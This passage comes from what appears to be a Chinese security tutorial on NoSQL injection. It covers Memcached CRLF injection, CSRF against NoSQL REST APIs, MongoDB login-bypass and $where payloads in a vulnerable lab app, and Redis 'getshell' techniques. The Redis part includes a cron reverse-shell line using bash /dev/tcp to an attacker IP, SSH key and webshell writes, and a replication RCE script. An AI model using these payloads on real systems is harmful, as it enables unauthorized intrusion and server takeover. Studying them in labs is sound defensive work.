I码采取措施,导致攻击者有机会注入包含有键参数的新命令行和其
他非计划内的命令到缓存中8。如下代码,其中的$param是用户输入
并作为键来作用：
$memcached=new Memcached(); $memcached -
>addServer('localhost',11211); $memcached->set($param, "some
value");
攻击者可以提供以下输入进行注入攻击：
"key1 0 3600 4\r\nabcd\r\nset key2 0 3600 4\r\ninject\r\n"
增 加 到 数 据 库 中 的 第 一 个 键 是 具 有 "some
value"值的key1。攻击者可以增加其他的、非计划内的键到数据库
中,即带有"inject"值的key2。这种注入也可以发生在get命令上
。看一下Memcached主页上的示例,它以这三行开头：
Function get_foo(foo_id) foo = memcached_get("foo: " . foo_id)
return foo if defined foo
这个示例展示了Memcached的典型用法,在处理输入之前首先检查在
数据库中是不是已经存在了。假设用类似代码检查从用户那里接收
的认证令牌,验证他们是不是登录过了,那么就可以通过传递以下作
为令牌的字符串来利用它:
"random_token\r\nset my_crafted_token 0 3600 4\r\nroot\r\n"
当这个字符串作为令牌传递时,数据库将检查这个"random_token"
是否存在,然后将添加一个具有"root"值的"my_crafted_token"
。之后,攻击者就可以发送具有root身份的my_crafted_token令
牌了。 可以被这项技术攻击的其他指令还有：
incr  
decr  
delete 
在此,incr用于增加一个键的值,decr用于缩减一个键的值,以及de
lete用于删除一个键。攻击者也可以用像set和get函数一样的手段
来使用带来自己键参数的这三个函数。攻击者可以使用多条目函数
进行同样的注入：deleteMulti、getMulti和setMulti,其中每
一个键字段都可以被注入。回车换行注入可以被用于连接多个get请
求。在一项我们进行的测试中,包括原始get在内最多可以连接17条
。这样注入返回的结果是第一个键及其相应的值。
6、跨域违规
NoSQL数据库的另一个常见特点是，他们能够常常暴露能够从客户端
应 用 进 行 数 据 库 查 询 的 HTTP REST API 。 暴 露 REST API
的 数 据 库 包 括 MongoDB 、 CouchDB 和 HBase 。 暴 露 REST API
就直接把数据库暴露给应用了，甚至是仅基于HTML5的应用，因为它
不再需要间接的驱动程序了，让任何编程语言都可以在数据库上执
行HTTP查询。这么做的优势非常明显，但这一特点是否伴随着安全
风 险 ？ 我 们 的 回 答 是 肯 定 的 ： 这 种 REST
API给跨站点请求伪造（CSRF）暴露了数据库，让攻击者绕过了防
火墙和其他外围防御。
HTTP REST
APIs是NoSQL数据库中的一个流行模块，然而，它们引入了一类新
的漏洞，它甚至能让攻击者从其他域攻击数据库。在跨域攻击中，
攻击者利用合法用户和他们的网页浏览器执行有害的操作。是一种
跨站请求伪造（CSRF）攻击形式的违规行为，在此网站信任的用户
浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式
的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站
上，攻击者可以在目标数据库上执行post动作，从而破坏数据库。
现在让我们看看CSRF攻击是如何使用这个函数增加新文件到管理员
集合中的，从而在hr数据库（它被认为处于安全的内部网络中）中
增加了一个新的管理员用户，如下图所示。若想攻击成功，必须要
满足几个条件。首先，攻击者必须能操作一个网站，要么是他们自
己的网站，要么是利用不安全的网站。攻击在该网站放置一个HTML
表单以及一段将自动提交该表单的脚本，比如：
藏在防火墙后的内部网络内的用户被欺骗访问一个恶意外部网页，
这 将 导 致 在 内 部 网 络 的 NoSQL 数 据 库 的 REST API
上执行非预期的查询。
第二，攻击者必须通过网络诱骗或感染用户经常访问的网站欺骗用
户 进 入 被 感 染 的 网 站 。 最 后 ， 用 户 必 须 许 可 访 问 Mongoose
HTTP接口。
用这种方式，攻击者不必进入内部网络即可执行操作，在本例中，
是插入新数据到位于内部网络中的数据库中。这种攻击执行很简单
，但要求攻击者要提前侦察去识别主机、数据库名称，等等。
7、node.js注入(靶场)
靶场下载地址：https://github.com/Charlie-belmer/vulnerable-node-
app
环境：node.js、Mongodb
进入APP目录下使用命令: node server.js启动环境
PS：若提示错误，使用npm install 下载报错模块
登录绕过
此页面注入可使用重言式进行绕过登录。
使用burp抓包，如下图：
payload：
修改password
{"username":"admin","password":{"$ne":1}}
修改
{"username":{"$ne":1},"password":{"$ne":1}}
都可绕过账户密码登录
注入成功。
where注入
此页面类似联合查询注入。
注入恶意代码使得表达式为真来获取所有用户名。
payload：
username=' || '1'=='1
根据用户输入程序构造如下代码，带入数据库查询后返回所有用户信息
’$where‘:’this.username‘ == '' || '1'=='1'
NoSQL数据库GETSHELL方法
老生常谈，其实网上有很多关于Redis或Mongodb的漏洞利用方法，
不过本文既然是讲NoSQL，Redis和Mongodb算是NoSQL数据库中的
代表性数据库，所以本文也总结一下利用方法。
Redis getshell方法总结
环境搭建：
下载：wget http://download.redis.io/releases/redis-4.0.9.tar.gz
解压：tar -zxvf redis-4.0.9.tar.gz
cd redis-4.0.9
make
make test
make install
依次执行
配置redis.conf
注释 bind 127.0.0.1
关闭保护模式，将protected-mode yes改为no
未授权连接：
redis-cli -h 0.0.0.0 -p 6379 连接上靶机
crontab-计划任务
本机监听：
nc -lvvp 4444
redis：
set x "\n* * * * * bash -i >& /dev/tcp/192.168.239.136/8888
0>&1\n"
config set dir /var/spool/cron/
config set dbfilename root
save
接收到反弹shell。
ssh-keygen
本地生成秘钥：
cd .ssh
ssh-keygen -t rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
cat foo.txt | redis-cli -h 192.168.239.129 -x set crackit
redis：
redis-cli -h 192.168.239.129
config set dir /root/.ssh/
config get dir
config set dbfilename "authorized_keys"
save
最后本机运行
ssh -i id_rsa root@x.x.x.x
写入webshell
redis-cli -h 192.168.239.129
config set dir /var/www/html/
config set dbfilename shell.php
set x ""
save
写入成功
利用主从复制RCE
so文件：git clone https://github.com/n0b0dyCN/RedisModules-
ExecuteCommand(下载后进入目录make，获取恶意so文件)
python脚本：git clone https://github.com/Ridter/redis-rce.git
执行命令：python3 redis-rce.py -r 192.168.239.129 -p 6379 -L
192.168.239.136 -f module.so
成功获取shell。
MongoDB未授权访问
目标机：ubuntu
攻击机：kali
使用docker搭建漏洞环境。
拉取环境
sudo docker pull mongo
查看镜像
sudo docker images
启动容器
sudo docker run -d -p 27017:27017 --name mongodb mongo
查看mongodb容器IP
sudo $docker inspect mongodb | grep IPAddress
映射docker mongodb 27917端口到本机27917端口上
sudo iptables -t nat -A DOCKER -p tcp --dport 27917 -j DNAT --
to-destination 172.17.0.2:27017
nmap扫描：
至此，漏洞环境搭建成功。
使用metasploit扫描漏洞是否存在。
扫描模块
auxiliary/scanner/mongodb/mongodb_login
使用Mongodb连接工具。
下载地址：https://nosqlbooster.com/downloads
输入靶机IP，连接即可。
连接成功。
Memcached未授权访问
目标机:Centos7
环境搭建。
安装：
sudo yum install memcached
启动服务
sudo memcached -d -m 128 -p 11211 -u root
查看是否启动服务
sudo ps -ef | grep memcache
安装客户端
sudo yum install php-memcached
重启apache服务
service apache2 restart
查看端口开放
netstat -an |more
当显示如下图，漏洞环境搭建成功。
漏洞利用:
telnet 192.168.239.137 11211
成功。
CouchDB未授权访问
目标机：Kali
环境搭建:
wget
https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/C
VE-2017-12636/docker-compose.yml
下载环境并启动
docker-compose up -d
如 果 访 问 不 了 网 址 , 新 建 docker-
compose.yml，将如下代码复制进去即可。
version: '2'
services:
couchdb:
image: vulhub/couchdb:1.6.0
ports:
- "5984:5984"
环境搭建成功。
漏洞利用
http://192.168.239.129:5984/_config
//网址后面加上_config，出现如下图说明存在漏洞
总结
本文大概介绍了NoSQL注入的分类，主要讲的是MongoDB数据库注入
，背负式和跨域违规，网上资料算是极少，只能从其他文章中摘录
放到本文内。
不管是SQL注入还是Nosql注入，漏洞产生原因都是未对用户输入的
数据进行过滤或过滤不严谨，虽然NoSQL不使用SQL语句，但可根据
程序语言来进行注入，不管是PHP，Node.JS或其他语言，没有做好
数据过滤照样存在注入，果然世上没有绝对安全的应用，别问，问
就是研究的不够深。
参考链接
https://www.jianshu.com/p/25fb182ef52c
https://blog.csdn.net/qq_27446553/article/details/79379481?utm_m
edium=distribute.pc_aggpage_search_result.none-task-blog-
2~all~baidu_landing_v2~default-1-79379481.nonecase
https://cloud.tencent.com/developer/article/1602092
https://nullsweep.com/a-nosql-injection-primer-with-mongo/
https://scotch.io/@401/mongodb-injection-in-nodejs
https://www.cnblogs.com/wangyayun/p/6598166.html
精选留言
用户设置不下载评论